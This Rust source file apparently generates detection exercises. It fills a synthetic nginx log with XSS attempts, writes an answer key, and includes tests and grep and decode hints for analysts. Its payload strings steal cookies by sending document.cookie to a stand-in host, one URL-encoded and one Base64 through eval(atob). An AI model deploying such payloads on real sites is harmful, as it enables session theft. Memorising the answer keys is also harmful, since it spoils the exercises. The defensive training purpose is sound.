//! XSS Detection — `safe/`.
//!
//! Generated:
//!  - a web-server log with legitimate requests (noise): searches, comments,
//!    redirects with harmless values;
//!  - an interleaved series of XSS attempts against ONE parameter of one
//!    endpoint from a single external IP; the obfuscation is random
//!    (Plaintext / URL-encoded / Base64) and visible right in the log lines;
//!  - the correct answers (IP, parameter, obfuscation, hit count) are derived
//!    from the generated `access.log`.

use std::collections::BTreeMap;

use crate::question::{Level, Question};
use crate::rng::Rng;
use crate::scenario::gen::{browser_ua, nginx_ts, public_ip, tool_ua};
use crate::scenario::{build_questions, Artifact, Category, GeneratedScenario, Generator};

const QUESTIONS: &str = include_str!("../../../data/scenarios/safe/xss.toml");

/// XSS payload obfuscation — decides how the log line looks and the correct
/// Advanced answer.
#[derive(Clone, Copy)]
enum Obfuscation {
    Plaintext,
    UrlEncoded,
    Base64,
}

impl Obfuscation {
    fn all() -> [Obfuscation; 3] {
        [
            Obfuscation::Plaintext,
            Obfuscation::UrlEncoded,
            Obfuscation::Base64,
        ]
    }

    fn answer(self) -> &'static str {
        match self {
            Obfuscation::Plaintext => "Plaintext",
            Obfuscation::UrlEncoded => "URL-encoded",
            Obfuscation::Base64 => "Base64",
        }
    }

    /// Short form — accepted alongside the full one (for its own type only).
    fn short(self) -> &'static str {
        match self {
            Obfuscation::Plaintext => "plain",
            Obfuscation::UrlEncoded => "url",
            Obfuscation::Base64 => "b64",
        }
    }

    /// Query string with an XSS in parameter `param`.
    fn payload(self, param: &str) -> String {
        match self {
            Obfuscation::Plaintext => {
                format!("{param}=<script>alert(document.cookie)</script>")
            }
            Obfuscation::UrlEncoded => format!(
                "{param}=%3Cscript%3Edocument.location='//evil.example/'%2Bdocument.cookie%3C%2Fscript%3E"
            ),
            // eval(atob('...')) — payload hidden in Base64.
            Obfuscation::Base64 => format!(
                "{param}=<img src=x onerror=eval(atob('ZG9jdW1lbnQubG9jYXRpb249Jy8vZXZpbC5leGFtcGxlLycrZG9jdW1lbnQuY29va2ll'))>"
            ),
        }
    }
}

pub struct Xss;

impl Generator for Xss {
    fn id(&self) -> &'static str {
        "xss"
    }

    fn title(&self) -> &'static str {
        "XSS Detection"
    }

    fn category(&self) -> Category {
        Category::Safe
    }

    fn tools(&self) -> Vec<String> {
        [
            "/var/log/nginx/access.log",
            "grep -Ei \"<script|onerror=|onload=|javascript:|%3Cscript|atob\\(\" access.log",
            "python3 -c 'import urllib.parse,sys;print(urllib.parse.unquote(sys.argv[1]))'",
            "python3 -c 'import base64,sys;print(base64.b64decode(sys.argv[1]))'",
            "cut -d' ' -f1 access.log | sort | uniq -c | sort -rn",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect()
    }

    fn generate(&self, rng: &mut Rng, level: Level) -> GeneratedScenario {
        let endpoint = *rng
            .pick(&[
                "/search",
                "/guestbook.php",
                "/feedback.php",
                "/profile",
                "/comments",
            ])
            .unwrap();
        let param = *rng
            .pick(&["q", "comment", "search", "name", "redirect"])
            .unwrap();
        let obf = *rng.pick(&Obfuscation::all()).unwrap();
        let attacker_ip = public_ip(rng);

        let mut lines: Vec<(u64, String)> = Vec::new();

        // Noise: legitimate values of the same parameter — plain text,
        // occasionally with harmless angle brackets and ampersands (false trail).
        let noise = rng.range(30, 48);
        for _ in 0..noise {
            let t = rng.range(0, 900);
            let ip = public_ip(rng);
            let val = *rng
                .pick(&[
                    "hello world",
                    "price %3C 100 %26 in stock",
                    "C%2B%2B tutorial",
                    "/dashboard",
                    "sneakers",
                ])
                .unwrap();
            let q = format!("{endpoint}?{param}={val}");
            lines.push((t, access_line(&ip, t, "GET", &q, 200, browser_ua(rng), rng)));
        }

        // Attack: a series of XSS attempts from one IP.
        let attack_hits = rng.range(7, 17);
        let attack_start = rng.range(900, 1100);
        for i in 0..attack_hits {
            let t = attack_start + i * rng.range(2, 9);
            let q = format!("{endpoint}?{}", obf.payload(param));
            lines.push((
                t,
                access_line(&attacker_ip, t, "GET", &q, 200, tool_ua(rng), rng),
            ));
        }

        lines.sort_by_key(|(t, _)| *t);
        let access_log = lines
            .into_iter()
            .map(|(_, l)| l)
            .collect::<Vec<_>>()
            .join("\n");

        let mut facts = BTreeMap::new();
        facts.insert("endpoint".into(), endpoint.to_string());
        facts.insert("param".into(), param.to_string());
        facts.insert("attacker_ip".into(), attacker_ip.clone());
        facts.insert("xss_obfuscation".into(), obf.answer().to_string());
        facts.insert("xss_obfuscation_short".into(), obf.short().to_string());
        facts.insert("attack_hits".into(), attack_hits.to_string());
        facts.insert("verdict".into(), "XSS".to_string());

        let artifacts = vec![Artifact::new("/var/log/nginx/access.log", access_log)];

        let questions: Vec<Question> =
            build_questions(QUESTIONS, &facts, level, rng).expect("embedded xss.toml is valid");

        GeneratedScenario {
            id: self.id().into(),
            title: self.title().into(),
            category: self.category(),
            tools: self.tools(),
            facts,
            artifacts,
            questions,
        }
    }
}

/// An access.log line in nginx combined format.
fn access_line(
    ip: &str,
    t: u64,
    method: &str,
    path: &str,
    status: u16,
    ua: &str,
    rng: &mut Rng,
) -> String {
    let bytes = rng.range(180, 6000);
    format!(
        "{ip} - - {ts} \"{method} {path} HTTP/1.1\" {status} {bytes} \"-\" \"{ua}\"",
        ts = nginx_ts(t)
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn generates_expected_shape() {
        let g = Xss;
        for seed in 0..30 {
            for level in Level::ALL {
                let mut rng = Rng::new(seed);
                let s = g.generate(&mut rng, level);
                assert_eq!(s.category, Category::Safe);
                assert!(!s.questions.is_empty());
                assert!(s.artifacts.iter().any(|a| a.name.ends_with("access.log")));
                assert!(s.facts.contains_key("attacker_ip"));
                assert!(s.facts.contains_key("xss_obfuscation"));
                let log = &s.artifacts[0].body;
                assert!(log.contains(s.facts["attacker_ip"].as_str()));
                assert!(log.contains(s.facts["param"].as_str()));
            }
        }
    }

    #[test]
    fn same_seed_same_output() {
        let g = Xss;
        let mut a = Rng::new(99);
        let mut b = Rng::new(99);
        let sa = g.generate(&mut a, Level::Intermediate);
        let sb = g.generate(&mut b, Level::Intermediate);
        assert_eq!(sa.facts, sb.facts);
        assert_eq!(
            sa.artifacts.iter().map(|x| &x.body).collect::<Vec<_>>(),
            sb.artifacts.iter().map(|x| &x.body).collect::<Vec<_>>()
        );
    }
}
